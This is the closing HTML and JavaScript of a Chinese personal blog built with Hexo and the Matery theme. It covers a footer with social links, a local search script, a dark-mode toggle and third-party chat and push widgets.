        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
